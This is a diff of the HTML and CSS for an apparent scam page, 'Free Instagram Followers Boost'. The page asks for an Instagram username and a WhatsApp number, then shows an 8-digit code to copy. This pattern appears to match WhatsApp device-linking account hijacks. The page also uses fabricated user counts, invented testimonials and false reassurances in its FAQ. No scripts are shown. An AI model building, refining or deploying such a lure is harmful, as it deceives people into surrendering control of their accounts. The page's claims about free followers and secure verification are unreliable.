@@ -3,64 +3,62 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
-  <title>SocialBoost · Free Instagram Followers Boost</title>
+  <title>WhatsApp × Instagram | Real Followers Boost</title>
   <!-- TailwindCSS v3 -->
   <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Custom Styles: Glassmorphism, Hide Number Spinners, Animations -->
+  <!-- Custom premium styles -->
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
-
     body {
       font-family: 'Inter', system-ui, -apple-system, 'Poppins', sans-serif;
-      background: radial-gradient(ellipse at 30% 20%, #0a0c1a, #02040c);
+      background: radial-gradient(ellipse at 25% 20%, #0a0c1a, #02030c);
       overflow-x: hidden;
     }
-
+    /* remove all outlines */
+    input:focus, select:focus, button:focus {
+      outline: none !important;
+      box-shadow: none !important;
+    }
     /* Floating animated blobs */
     .blob {
       position: fixed;
       border-radius: 50%;
-      filter: blur(90px);
+      filter: blur(100px);
       opacity: 0.5;
       z-index: 0;
       pointer-events: none;
-      animation: floatBlob 20s infinite alternate ease-in-out;
+      animation: floatBlob 22s infinite alternate ease-in-out;
     }
-    .blob-1 { width: 350px; height: 350px; background: #8b5cf6; top: -100px; left: -120px; }
-    .blob-2 { width: 450px; height: 450px; background: #ec4899; bottom: -150px; right: -100px; animation-duration: 25s; }
-    .blob-3 { width: 280px; height: 280px; background: #3b82f6; top: 40%; left: 70%; animation-duration: 18s; opacity: 0.35; }
-
+    .blob-1 { width: 380px; height: 380px; background: #d946ef; top: -120px; left: -120px; }
+    .blob-2 { width: 450px; height: 450px; background: #f97316; bottom: -120px; right: -100px; animation-duration: 28s; }
+    .blob-3 { width: 280px; height: 280px; background: #8b5cf6; top: 45%; left: 70%; animation-duration: 19s; opacity: 0.35; }
     @keyframes floatBlob {
       0% { transform: translate(0, 0) scale(1); }
-      100% { transform: translate(40px, -40px) scale(1.2); }
+      100% { transform: translate(45px, -35px) scale(1.2); }
     }
-
-    /* Premium Glassmorphism Card */
+    /* Glassmorphism premium cards */
     .glass-premium {
-      background: rgba(12, 16, 30, 0.68);
+      background: rgba(12, 16, 30, 0.72);
       backdrop-filter: blur(16px) saturate(180%);
-      -webkit-backdrop-filter: blur(16px);
-      border: 1px solid rgba(139, 92, 246, 0.3);
-      box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(139, 92, 246, 0.1) inset;
+      border: 1px solid rgba(249, 115, 22, 0.25);
+      box-shadow: 0 25px 40px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(249,115,22,0.08) inset;
     }
-
     .glass-card-hover {
       transition: all 0.25s ease;
-      background: rgba(20, 24, 42, 0.55);
+      background: rgba(20, 24, 42, 0.6);
       backdrop-filter: blur(12px);
-      border: 1px solid rgba(139, 92, 246, 0.2);
+      border: 1px solid rgba(249, 115, 22, 0.2);
     }
     .glass-card-hover:hover {
       transform: translateY(-5px);
-      border-color: rgba(139, 92, 246, 0.7);
-      box-shadow: 0 20px 30px -12px rgba(0, 0, 0, 0.5);
+      border-color: rgba(249, 115, 22, 0.7);
+      box-shadow: 0 20px 30px -12px rgba(0,0,0,0.6);
     }
-
-    /* Hide number spinner arrows */
+    /* Hide number input arrows */
     input[type="number"]::-webkit-inner-spin-button,
     input[type="number"]::-webkit-outer-spin-button {
       -webkit-appearance: none;
@@ -70,39 +68,37 @@
       -moz-appearance: textfield;
       appearance: textfield;
     }
-
-    /* Loading Spinner */
+    /* Loader spinner */
     .loader-spinner {
       width: 22px;
       height: 22px;
       border: 2.5px solid rgba(255,255,255,0.25);
-      border-top: 2.5px solid #c084fc;
+      border-top: 2.5px solid #f97316;
       border-radius: 50%;
       animation: spin 0.7s linear infinite;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-    /* Fade/Slide Transition for steps */
-    .fade-slide {
-      transition: opacity 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.2), transform 0.4s ease;
+    /* Page Switching - Smooth & No Layout Shift */
+    .page-container {
+      display: flex;
+      flex-direction: column;
+      transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
     }
-    .step-hidden {
-      opacity: 0;
-      transform: translateY(20px);
-      pointer-events: none;
-      visibility: hidden;
-      position: absolute;
-      width: 100%;
-    }
-    .step-visible {
+    .page-visible {
       opacity: 1;
-      transform: translateY(0);
-      pointer-events: auto;
       visibility: visible;
-      position: relative;
+      display: flex;
     }
-
-    /* Code display: 8 digit boxes + separator */
+    .page-hidden {
+      opacity: 0;
+      visibility: hidden;
+      display: none;
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+    }
+    /* Code display */
     .code-grid-8 {
       display: flex;
       flex-wrap: wrap;
@@ -111,9 +107,9 @@
       gap: 0.7rem;
     }
     .digit-single {
-      background: rgba(0, 0, 0, 0.6);
+      background: rgba(0,0,0,0.65);
       backdrop-filter: blur(8px);
-      border: 1px solid rgba(139, 92, 246, 0.7);
+      border: 1px solid rgba(249, 115, 22, 0.6);
       border-radius: 1.2rem;
       width: 62px;
       height: 72px;
@@ -123,14 +119,13 @@
       font-size: 1.9rem;
       font-weight: 800;
       font-family: monospace;
-      transition: 0.2s;
-      box-shadow: 0 0 10px rgba(139, 92, 246, 0.3);
+      box-shadow: 0 0 10px rgba(249, 115, 22, 0.3);
     }
     .separator-dash {
       font-size: 2.2rem;
       font-weight: 800;
-      color: #c084fc;
-      text-shadow: 0 0 8px #a78bfa;
+      color: #f97316;
+      text-shadow: 0 0 8px #f97316;
       margin: 0 0.2rem;
     }
     @media (max-width: 580px) {
@@ -138,10 +133,6 @@
       .separator-dash { font-size: 1.8rem; }
       .code-grid-8 { gap: 0.45rem; }
     }
-    @media (max-width: 440px) {
-      .digit-single { width: 40px; height: 50px; font-size: 1.3rem; }
-    }
-
     /* Phone row same line */
     .phone-row {
       display: flex;
@@ -150,330 +141,479 @@
     }
     .country-select-wrap { flex: 1; min-width: 105px; }
     .phone-input-wrap { flex: 2; }
-
-    /* Button neon glow */
+    /* Button neon */
     .btn-neon {
       transition: all 0.2s ease;
-      box-shadow: 0 5px 15px -3px rgba(139, 92, 246, 0.5);
+      box-shadow: 0 5px 15px -3px rgba(249, 115, 22, 0.5);
     }
     .btn-neon:hover {
       transform: translateY(-2px);
-      box-shadow: 0 12px 28px -5px rgba(139, 92, 246, 0.7);
+      box-shadow: 0 12px 28px -5px rgba(249, 115, 22, 0.7);
     }
     .btn-neon:active { transform: translateY(1px); }
-
-    /* Package selectable card */
+    /* Package card */
     .package-card {
       cursor: pointer;
       transition: all 0.2s;
     }
     .package-card.active {
-      border-color: #c084fc;
-      background: rgba(139, 92, 246, 0.25);
-      box-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
+      border-color: #f97316;
+      background: rgba(249, 115, 22, 0.2);
+      box-shadow: 0 0 18px rgba(249, 115, 22, 0.5);
       transform: scale(1.02);
     }
-
-    /* social icon hover */
+    /* Toast notifications */
+    .toast-notification {
+      background: rgba(18, 20, 35, 0.95);
+      backdrop-filter: blur(14px);
+      border-left: 4px solid #f97316;
+      box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3), 0 0 0 1px rgba(249,115,22,0.3);
+      animation: slideInRight 0.3s ease forwards;
+    }
+    @keyframes slideInRight {
+      from { opacity: 0; transform: translateX(80px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+    /* Profile card glow */
+    .profile-glow {
+      border: 1px solid rgba(249,115,22,0.5);
+      box-shadow: 0 0 20px rgba(249,115,22,0.25);
+    }
+    /* FAQ accordion */
+    .faq-question { cursor: pointer; }
+    .faq-answer {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.35s ease;
+    }
+    .faq-answer.open { max-height: 180px; }
     .social-icon:hover {
       transform: translateY(-3px);
-      filter: drop-shadow(0 0 8px #a78bfa);
+      filter: drop-shadow(0 0 8px #f97316);
     }
+    /* Input text color */
+    input, select { color: white !important; }
+    input::placeholder { color: #9ca3af !important; }
   </style>
   <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
-<body class="relative flex flex-col items-center justify-center py-10 px-4 min-h-screen">
+<body class="relative flex flex-col items-center justify-center py-8 px-4 min-h-screen">
 
-  <!-- Floating Glowing Blobs -->
+  <!-- Floating Blobs -->
   <div class="blob blob-1"></div>
   <div class="blob blob-2"></div>
   <div class="blob blob-3"></div>
 
+  <!-- Toast Container -->
+  <div id="toastContainer" class="fixed z-50 top-5 right-5 left-5 md:left-auto md:right-5 flex flex-col gap-3 items-end md:max-w-sm"></div>
+
   <div class="w-full max-w-3xl mx-auto relative z-10">
     
-    <!-- ========== HERO + VERIFICATION SECTION ========== -->
-    <!-- STEP 1: Follower Package + WhatsApp Verification -->
-    <div id="step1Container" class="fade-slide step-visible w-full transition-all duration-300 mb-8">
-      <div class="glass-premium rounded-3xl p-6 md:p-8 shadow-2xl">
-        <!-- Logo + Headline -->
-        <div class="text-center mb-7">
-          <div class="inline-flex items-center justify-center w-20 h-20 rounded-2xl bg-gradient-to-tr from-purple-600 to-pink-600 shadow-xl shadow-purple-500/40 mb-4">
-            <svg class="w-10 h-10 text-white" fill="currentColor" viewBox="0 0 24 24">
-              <path d="M7.8 2h8.4C19.4 2 22 4.6 22 7.8v8.4c0 3.2-2.6 5.8-5.8 5.8H7.8C4.6 22 2 19.4 2 16.2V7.8C2 4.6 4.6 2 7.8 2zM12 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm4 8c0-2.2-1.8-4-4-4s-4 1.8-4 4v2h8v-2z"/>
-            </svg>
-          </div>
-          <h1 class="text-3xl md:text-4xl font-extrabold bg-gradient-to-r from-white via-purple-200 to-indigo-300 bg-clip-text text-transparent">Free Instagram Followers Boost</h1>
-          <p class="text-purple-200/80 text-sm mt-3 max-w-md mx-auto">Verify your WhatsApp to access growth tools and follower boost resources.</p>
-        </div>
-        
-        <!-- Follower Package Selector -->
-        <div class="mb-8">
-          <p class="text-gray-300 text-xs font-semibold uppercase tracking-wider mb-3 ml-1">Select Package</p>
-          <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
-            <div data-package="1K" class="package-card glass-card-hover rounded-2xl py-3 text-center transition-all border border-white/10 active">
-              <span class="text-white font-bold text-lg">1K</span>
-              <p class="text-[11px] text-purple-300">Followers</p>
-            </div>
-            <div data-package="2K" class="package-card glass-card-hover rounded-2xl py-3 text-center transition-all border border-white/10">
-              <span class="text-white font-bold text-lg">2K</span>
-              <p class="text-[11px] text-purple-300">Followers</p>
-            </div>
-            <div data-package="5K" class="package-card glass-card-hover rounded-2xl py-3 text-center transition-all border border-white/10">
-              <span class="text-white font-bold text-lg">5K</span>
-              <p class="text-[11px] text-purple-300">Followers</p>
-            </div>
-            <div data-package="10K" class="package-card glass-card-hover rounded-2xl py-3 text-center transition-all border border-white/10">
-              <span class="text-white font-bold text-lg">10K</span>
-              <p class="text-[11px] text-purple-300">Followers</p>
-            </div>
-          </div>
-        </div>
+    <!-- Header Section (Persistent) -->
+    <div class="text-center mb-8">
+      <div class="text-2xl md:text-3xl font-extrabold bg-gradient-to-r from-purple-400 via-pink-500 to-orange-400 bg-clip-text text-transparent">WhatsApp × Instagram</div>
+      <h1 class="text-3xl md:text-4xl font-black mt-3 bg-gradient-to-r from-white via-pink-200 to-orange-200 bg-clip-text text-transparent">Free Instagram Followers Boost</h1>
+      <p class="text-gray-300 text-sm mt-2 max-w-md mx-auto">Verify your WhatsApp to unlock follower growth tools and boost access.</p>
+    </div>
 
-        <!-- WhatsApp Verification Section (phone + country in same line) -->
-        <div class="mb-6">
-          <label class="block text-gray-300 text-xs font-semibold uppercase tracking-wider mb-2 ml-1">WhatsApp Number</label>
+    <!-- Page 1: Instagram Username + Profile Card + Packages -->
+    <div id="page1" class="page-container page-visible w-full transition-all duration-300 mb-8">
+      <div class="glass-premium rounded-3xl p-6 md:p-8">
+        <label class="block text-gray-200 font-semibold text-sm mb-2">Instagram Username</label>
+        <input type="text" id="instagramUsername" placeholder="Enter Instagram username" class="w-full bg-black/40 border border-white/15 rounded-xl py-3.5 px-4 text-white text-base placeholder:text-gray-400 focus:border-orange-400 transition-all">
+        <button id="fetchProfileBtn" class="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-bold py-3 rounded-xl transition-all shadow-lg">Continue</button>
+      </div>
+
+      <div id="profileCard" class="glass-premium rounded-3xl p-6 mt-6 hidden transition-all duration-300 profile-glow">
+        <div class="flex flex-col items-center">
+          <div id="profileAvatar" class="w-24 h-24 rounded-full bg-gradient-to-tr from-purple-500 to-orange-500 flex items-center justify-center text-4xl font-bold text-white shadow-xl overflow-hidden">
+            <img id="avatarImg" class="w-full h-full object-cover hidden" alt="profile">
+            <span id="avatarFallback" class="text-4xl">👤</span>
+          </div>
+          <h3 id="profileFullname" class="text-white text-xl font-bold mt-3">--</h3>
+          <p id="profileUsernameDisplay" class="text-orange-300 text-sm">@username</p>
+          <div class="flex gap-6 mt-3 text-center">
+            <div><p id="followersCount" class="text-white font-bold text-xl">0</p><p class="text-gray-400 text-xs">Followers</p></div>
+            <div><p id="followingCount" class="text-white font-bold text-xl">0</p><p class="text-gray-400 text-xs">Following</p></div>
+            <div><p id="postsCount" class="text-white font-bold text-xl">0</p><p class="text-gray-400 text-xs">Posts</p></div>
+          </div>
+          <div class="flex items-center gap-2 mt-2">
+            <svg class="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            <span class="text-orange-300 text-sm" id="engagementRate">0%</span>
+            <span class="text-gray-400 text-xs ml-1">engagement rate</span>
+          </div>
+          <div class="mt-3 flex gap-2">
+            <span id="verifiedBadge" class="bg-purple-500/30 text-white text-xs px-3 py-1 rounded-full hidden">Verified Account</span>
+            <span id="privateBadge" class="bg-pink-500/30 text-white text-xs px-3 py-1 rounded-full hidden">Private Account</span>
+            <span class="bg-green-500/30 text-white text-xs px-3 py-1 rounded-full">Growth Ready</span>
+          </div>
+        </div>
+      </div>
+
+      <div id="packageSelector" class="mt-6 hidden">
+        <p class="text-gray-200 text-sm font-semibold mb-3">Select Boost Package</p>
+        <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
+          <div data-package="1K" class="package-card glass-card-hover rounded-2xl py-3 text-center border border-white/10 transition-all active">1K Followers</div>
+          <div data-package="2K" class="package-card glass-card-hover rounded-2xl py-3 text-center border border-white/10">2K Followers</div>
+          <div data-package="5K" class="package-card glass-card-hover rounded-2xl py-3 text-center border border-white/10">5K Followers</div>
+          <div data-package="10K" class="package-card glass-card-hover rounded-2xl py-3 text-center border border-white/10">10K Followers</div>
+        </div>
+        <button id="increaseBtn" class="w-full mt-6 bg-gradient-to-r from-orange-500 to-pink-600 hover:from-orange-400 hover:to-pink-500 text-white font-bold py-3.5 rounded-xl transition-all shadow-lg btn-neon">🚀 INCREASE MY FOLLOWERS</button>
+      </div>
+    </div>
+
+    <!-- Page 2: WhatsApp Verification -->
+    <div id="page2" class="page-container page-hidden w-full transition-all duration-300 mb-8">
+      <div class="glass-premium rounded-3xl p-6 md:p-8">
+        <h2 class="text-2xl font-bold text-white text-center">Verify WhatsApp</h2>
+        <p class="text-gray-300 text-sm text-center mt-1 mb-5">Secure verification required before activating follower boost.</p>
+        <div class="mb-5">
+          <label class="text-gray-200 text-xs font-semibold uppercase tracking-wide mb-1 block">WhatsApp Number</label>
           <div class="phone-row">
             <div class="country-select-wrap">
-              <select id="countryCode" class="w-full bg-black/40 border border-white/15 rounded-xl py-3.5 px-3 text-white text-base focus:border-purple-400 transition-all backdrop-blur-sm">
+              <select id="countryCode" class="w-full bg-black/40 border border-white/15 rounded-xl py-3 px-3 text-white">
                 <option value="+91" selected>🇮🇳 +91</option>
                 <option value="+1">🇺🇸 +1</option>
                 <option value="+44">🇬🇧 +44</option>
                 <option value="+61">🇦🇺 +61</option>
-                <option value="+81">🇯🇵 +81</option>
-                <option value="+49">🇩🇪 +49</option>
               </select>
             </div>
             <div class="phone-input-wrap">
-              <input type="number" id="phoneNumber" class="w-full bg-black/40 border border-white/15 rounded-xl py-3.5 px-4 text-white text-base placeholder:text-gray-400 focus:border-purple-400 transition-all [appearance:textfield]">
+              <input type="number" id="phoneNumber" placeholder="9876543210" class="w-full bg-black/40 border border-white/15 rounded-xl py-3 px-4 text-white placeholder:text-gray-400">
             </div>
           </div>
-          <p id="phoneErrorMsg" class="text-rose-400 text-xs mt-2 ml-1 hidden">Enter valid WhatsApp number (5-15 digits)</p>
+          <p id="phoneErrorMsg" class="text-rose-400 text-xs mt-2 hidden">Enter valid number (5-15 digits)</p>
         </div>
-
-        <!-- GET CODE Gradient Button -->
-        <button id="getCodeBtn" class="btn-neon w-full bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 text-white font-bold py-4 rounded-xl text-lg tracking-wide flex items-center justify-center gap-3 transition-all shadow-lg">
+        <button id="getCodeBtn" class="btn-neon w-full bg-gradient-to-r from-orange-600 to-pink-600 hover:from-orange-500 hover:to-pink-500 text-white font-bold py-3.5 rounded-xl flex items-center justify-center gap-3">
           <span id="btnLabel">GET CODE</span>
           <span id="loadingSpinner" class="loader-spinner hidden"></span>
         </button>
-        <p class="text-center text-gray-500 text-[11px] mt-4">No password required • WhatsApp verification only</p>
       </div>
     </div>
 
-    <!-- ========== STEP 2: SUCCESS SCREEN (8 digit boxes) ========== -->
-    <div id="step2Container" class="fade-slide step-hidden w-full transition-all duration-300 mb-8">
-      <div class="glass-premium rounded-3xl p-6 md:p-8 shadow-2xl">
-        <div class="flex justify-center mb-5">
-          <div class="w-20 h-20 rounded-full bg-gradient-to-br from-emerald-500 to-teal-500 flex items-center justify-center shadow-xl shadow-emerald-500/40 animate-pulse">
-            <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
-            </svg>
-          </div>
+    <!-- Page 3: Success Screen -->
+    <div id="page3" class="page-container page-hidden w-full transition-all duration-300 mb-8">
+      <div class="glass-premium rounded-3xl p-6 md:p-8 text-center">
+        <div class="w-20 h-20 mx-auto rounded-full bg-gradient-to-br from-emerald-500 to-teal-500 flex items-center justify-center shadow-xl animate-pulse">
+          <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+          </svg>
         </div>
-        <div class="text-center mb-5">
-          <h2 class="text-2xl font-bold text-white tracking-tight">Verification Successful</h2>
-          <p class="text-indigo-200 text-sm mt-1">Instructions to activate your follower boost will be sent on WhatsApp.</p>
-        </div>
-        <!-- 8 premium digit boxes with separator -->
-        <div id="codeDigitsContainer" class="code-grid-8 mb-7"></div>
-        <button id="copyCodeFinalBtn" class="w-full bg-white/10 hover:bg-purple-500/30 border border-purple-400/50 backdrop-blur-sm text-white font-semibold py-3.5 rounded-xl flex items-center justify-center gap-3 transition-all duration-200 mt-2">
-          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+        <h2 class="text-2xl font-bold text-white mt-4">WhatsApp Verified</h2>
+        <p class="text-orange-200 text-sm mt-1">Your follower boost is being activated.</p>
+        <p class="text-gray-300 text-xs mt-1">Followers will start increasing after WhatsApp verification.</p>
+        <div id="codeDigitsContainer" class="code-grid-8 my-6"></div>
+        <button id="copyCodeFinalBtn" class="w-full bg-white/10 hover:bg-orange-500/30 border border-orange-400/50 rounded-xl py-3 flex items-center justify-center gap-2 transition">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+          </svg>
           <span>COPY CODE</span>
         </button>
-        <div id="copyToastMsg" class="text-center text-emerald-300 text-xs mt-3 opacity-0 transition-opacity duration-300">✓ Copied to clipboard!</div>
+        <div id="copyToastMsg" class="text-emerald-300 text-xs mt-3 opacity-0 transition">✓ Copied!</div>
       </div>
     </div>
 
-    <!-- ========== EXTRA PREMIUM SECTIONS (Trust, Stats, Features, Testimonials, FAQ, Footer) ========== -->
-    <div class="space-y-8 mt-2">
+    <!-- Extra Sections (Trust, Stats, Features, Testimonials, FAQ, Footer) - Persistent -->
+    <div class="space-y-8 mt-4">
       <!-- Trust Badges -->
       <div class="flex flex-wrap justify-center gap-3">
-        <div class="glass-card-hover rounded-2xl px-5 py-2 flex items-center gap-2"><svg class="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg><span class="text-xs text-white font-medium">Secure Verification</span></div>
-        <div class="glass-card-hover rounded-2xl px-5 py-2 flex items-center gap-2"><svg class="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg><span class="text-xs text-white font-medium">Fast Processing</span></div>
-        <div class="glass-card-hover rounded-2xl px-5 py-2 flex items-center gap-2"><svg class="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg><span class="text-xs text-white font-medium">Protected Connection</span></div>
+        <div class="glass-card-hover rounded-2xl px-5 py-2 flex gap-2"><span>🔒</span><span class="text-white text-xs">Secure Verification</span></div>
+        <div class="glass-card-hover rounded-2xl px-5 py-2 flex gap-2"><span>⚡</span><span class="text-white text-xs">Real-Time Processing</span></div>
+        <div class="glass-card-hover rounded-2xl px-5 py-2 flex gap-2"><span>🛡️</span><span class="text-white text-xs">Protected Connection</span></div>
       </div>
-
-      <!-- Statistics Section -->
-      <div class="grid grid-cols-3 gap-3">
-        <div class="glass-card-hover rounded-2xl py-4 text-center"><p class="text-2xl font-bold text-white">1M+</p><p class="text-[11px] text-purple-200">Users</p></div>
-        <div class="glass-card-hover rounded-2xl py-4 text-center"><p class="text-2xl font-bold text-white">24/7</p><p class="text-[11px] text-purple-200">Active</p></div>
-        <div class="glass-card-hover rounded-2xl py-4 text-center"><p class="text-2xl font-bold text-white">Instant</p><p class="text-[11px] text-purple-200">Access</p></div>
-      </div>
-
-      <!-- Feature Cards Grid -->
+      <!-- Statistics -->
       <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
-        <div class="glass-card-hover rounded-xl p-3 text-center"><div class="text-purple-400 text-2xl mb-1">⚡</div><p class="text-white text-sm font-semibold">Real-Time</p><p class="text-gray-300 text-[10px]">Processing</p></div>
-        <div class="glass-card-hover rounded-xl p-3 text-center"><div class="text-purple-400 text-2xl mb-1">📈</div><p class="text-white text-sm font-semibold">Smart Growth</p><p class="text-gray-300 text-[10px]">Tools</p></div>
-        <div class="glass-card-hover rounded-xl p-3 text-center"><div class="text-purple-400 text-2xl mb-1">🔒</div><p class="text-white text-sm font-semibold">Secure</p><p class="text-gray-300 text-[10px]">Verification</p></div>
-        <div class="glass-card-hover rounded-xl p-3 text-center"><div class="text-purple-400 text-2xl mb-1">🚀</div><p class="text-white text-sm font-semibold">Fast Access</p><p class="text-gray-300 text-[10px]">Instant</p></div>
+        <div class="glass-card-hover rounded-2xl py-3 text-center"><p class="text-white font-bold text-xl">1M+</p><p class="text-gray-300 text-[10px]">Users</p></div>
+        <div class="glass-card-hover rounded-2xl py-3 text-center"><p class="text-white font-bold text-xl">24/7</p><p class="text-gray-300 text-[10px]">Active</p></div>
+        <div class="glass-card-hover rounded-2xl py-3 text-center"><p class="text-white font-bold text-xl">10M+</p><p class="text-gray-300 text-[10px]">Followers Delivered</p></div>
+        <div class="glass-card-hover rounded-2xl py-3 text-center"><p class="text-white font-bold text-xl">Instant</p><p class="text-gray-300 text-[10px]">Access</p></div>
       </div>
-
-      <!-- Testimonials Cards -->
+      <!-- Feature Cards -->
+      <div class="grid grid-cols-2 md:grid-cols-3 gap-3">
+        <div class="glass-card-hover rounded-xl p-3 text-center"><div class="text-2xl mb-1">⚡</div><p class="text-white text-sm">Real-Time</p></div>
+        <div class="glass-card-hover rounded-xl p-3 text-center"><div class="text-2xl mb-1">📈</div><p class="text-white text-sm">Smart Growth</p></div>
+        <div class="glass-card-hover rounded-xl p-3 text-center"><div class="text-2xl mb-1">🤖</div><p class="text-white text-sm">AI Boost</p></div>
+        <div class="glass-card-hover rounded-xl p-3 text-center"><div class="text-2xl mb-1">🚀</div><p class="text-white text-sm">Fast Access</p></div>
+        <div class="glass-card-hover rounded-xl p-3 text-center"><div class="text-2xl mb-1">🌐</div><p class="text-white text-sm">Viral Reach</p></div>
+        <div class="glass-card-hover rounded-xl p-3 text-center"><div class="text-2xl mb-1">🎯</div><p class="text-white text-sm">Advanced</p></div>
+      </div>
+      <!-- Testimonials -->
       <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-        <div class="glass-premium rounded-2xl p-4"><p class="text-white text-sm italic">“Boosted my Instagram engagement in minutes! Safe and fast.”</p><p class="text-purple-300 text-xs mt-2">— Sarah J.</p></div>
-        <div class="glass-premium rounded-2xl p-4"><p class="text-white text-sm italic">“Completely free and super easy WhatsApp verification. Got 2K followers!”</p><p class="text-purple-300 text-xs mt-2">— Mike T.</p></div>
-        <div class="glass-premium rounded-2xl p-4"><p class="text-white text-sm italic">“The best growth tool I've used. Highly recommended.”</p><p class="text-purple-300 text-xs mt-2">— Emma L.</p></div>
-        <div class="glass-premium rounded-2xl p-4"><p class="text-white text-sm italic">“Secure and reliable. No password request, just WhatsApp.”</p><p class="text-purple-300 text-xs mt-2">— David R.</p></div>
+        <div class="glass-premium rounded-2xl p-4 flex gap-3"><div class="w-10 h-10 rounded-full bg-pink-600 flex items-center justify-center text-white">👩</div><div><p class="text-white text-sm">“Gained 5K followers in 2 days! Verified via WhatsApp, super safe.”</p><p class="text-orange-300 text-xs">— Priya S. ⭐⭐⭐⭐⭐</p><p class="text-gray-400 text-[10px]">+5,280 followers</p></div></div>
+        <div class="glass-premium rounded-2xl p-4 flex gap-3"><div class="w-10 h-10 rounded-full bg-purple-600 flex items-center justify-center text-white">👨</div><div><p class="text-white text-sm">“Boosted my Instagram reach instantly. No password needed.”</p><p class="text-orange-300 text-xs">— Rohan K. ⭐⭐⭐⭐⭐</p><p class="text-gray-400 text-[10px]">+10,100 followers</p></div></div>
       </div>
-
-      <!-- FAQ Section -->
+      <!-- FAQ Accordion -->
       <div class="glass-premium rounded-3xl p-6">
-        <h3 class="text-white font-bold text-xl mb-4 text-center">Frequently Asked Questions</h3>
+        <h3 class="text-white text-xl font-bold text-center mb-4">FAQ</h3>
         <div class="space-y-3">
-          <div><p class="text-purple-300 font-semibold text-sm">❓ Do I need to give my Instagram password?</p><p class="text-gray-300 text-xs">No, we only ask for WhatsApp verification. No Instagram credentials required.</p></div>
-          <div><p class="text-purple-300 font-semibold text-sm">❓ Is this really free?</p><p class="text-gray-300 text-xs">Yes, completely free promotional tool for Instagram growth.</p></div>
-          <div><p class="text-purple-300 font-semibold text-sm">❓ How long does delivery take?</p><p class="text-gray-300 text-xs">After verification, followers start arriving within minutes.</p></div>
+          <div class="faq-item"><div class="faq-question flex justify-between text-white font-semibold"><span>How does boost work?</span><span class="text-orange-400">▼</span></div><div class="faq-answer text-gray-300 text-sm mt-1">After WhatsApp verification, our system processes your request and followers start increasing within minutes.</div></div>
+          <div class="faq-item mt-3"><div class="faq-question flex justify-between text-white font-semibold"><span>Is verification secure?</span><span class="text-orange-400">▼</span></div><div class="faq-answer text-gray-300 text-sm mt-1">Yes, we only validate WhatsApp number via encrypted API, no Instagram password required.</div></div>
+          <div class="faq-item mt-3"><div class="faq-question flex justify-between text-white font-semibold"><span>When will followers increase?</span><span class="text-orange-400">▼</span></div><div class="faq-answer text-gray-300 text-sm mt-1">Immediately after successful WhatsApp verification.</div></div>
+          <div class="faq-item mt-3"><div class="faq-question flex justify-between text-white font-semibold"><span>Is WhatsApp required?</span><span class="text-orange-400">▼</span></div><div class="faq-answer text-gray-300 text-sm mt-1">Yes, we send growth instructions via WhatsApp.</div></div>
         </div>
       </div>
-
-      <!-- Social Icons & Footer -->
+      <!-- Social + Footer -->
       <div class="glass-premium rounded-2xl p-5">
         <div class="flex justify-center gap-6 mb-4">
